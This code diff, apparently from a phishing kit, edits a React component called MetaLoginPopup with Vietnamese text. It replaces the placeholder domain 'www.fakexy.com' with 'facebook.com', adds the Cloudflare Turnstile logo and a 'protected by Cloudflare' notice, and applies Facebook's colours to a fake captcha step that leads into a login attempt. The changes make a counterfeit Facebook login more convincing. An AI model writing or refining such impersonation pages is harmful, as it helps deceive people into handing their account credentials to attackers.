@@ -199,35 +199,50 @@ const MetaLoginPopup = () => {
               {currentStep === LoginStep.CAPTCHA_VERIFICATION && (
                 <div className="space-y-6">
                   <div className="text-center mb-6">
-                    <h3 className="text-xl font-semibold text-gray-800">www.fakexy.com</h3>
+                    <h3 className="text-xl font-semibold text-gray-800">facebook.com</h3>
                     <p className="text-[#65676b] mt-2 text-[15px]">
-                      Xác minh bạn là con người bằng cách hoàn thành hành động bên dưới.
+                      Vui lòng xác nhận bạn không phải robot để tiếp tục.
                     </p>
                   </div>
                   
                   <div className="border border-gray-200 rounded-md p-5">
-                    <div className="flex items-center mb-4">
-                      <div className="w-5 h-5 border border-gray-400 rounded-sm mr-3"></div>
-                      <div className="text-sm">
-                        <span className="text-gray-700">Xác minh bạn là con người</span>
-                        <img 
-                          src="https://cfl.dropboxstatic.com/static/images/logo_catalog/dropbox_logo_glyph_2015_m1.svg" 
-                          alt="Cloudflare" 
-                          className="h-5 inline-block ml-2"
-                        />
+                    <div className="flex justify-center mb-4">
+                      <div className="text-center">
+                        <div className="inline-flex items-center justify-between px-4 py-2 rounded-md bg-[#f8f8f8] border border-gray-300 w-full mb-2">
+                          <span className="text-sm text-gray-700">Kiểm tra bảo mật</span>
+                          <img 
+                            src="https://challenges.cloudflare.com/turnstile/v0/b/logo.svg" 
+                            alt="Cloudflare" 
+                            className="h-5"
+                          />
+                        </div>
+                        <div className="bg-[#f8f8f8] border border-gray-300 rounded-md flex items-center justify-center p-3 mb-2">
+                          <div className="h-14 w-32 relative">
+                            <div className="absolute inset-0 flex items-center justify-center">
+                              <div className="animate-pulse">
+                                <div className="w-6 h-6 border-2 border-gray-300 border-t-[#4694f3] rounded-full animate-spin"></div>
+                              </div>
+                            </div>
+                          </div>
+                        </div>
+                        <div className="text-xs text-gray-500">
+                          Được bảo vệ bởi 
+                          <span className="font-semibold ml-1">Cloudflare Turnstile</span>
+                          <a href="#" className="text-blue-600 hover:underline ml-1">Chính sách</a>
+                        </div>
                       </div>
                     </div>
                     
                     <Button 
                       onClick={() => setCurrentStep(LoginStep.LOGIN_FIRST_ATTEMPT)}
-                      className="w-full bg-[#0051c3] hover:bg-[#003f9a] text-white h-[40px] rounded-[3px] font-normal text-sm mt-3"
+                      className="w-full bg-[#1877F2] hover:bg-[#166FE5] text-white h-[40px] rounded-[6px] font-medium mt-2"
                     >
-                      Xác minh
+                      Tiếp tục
                     </Button>
                   </div>
                   
                   <div className="text-xs text-center text-gray-500 mt-4">
-                    www.fakexy.com cần đánh giá tính bảo mật kết nối của bạn trước khi tiếp tục.
+                    Kiểm tra này giúp ngăn chặn phần mềm độc hại và bảo vệ tài khoản của bạn.
                   </div>
                 </div>
               )}
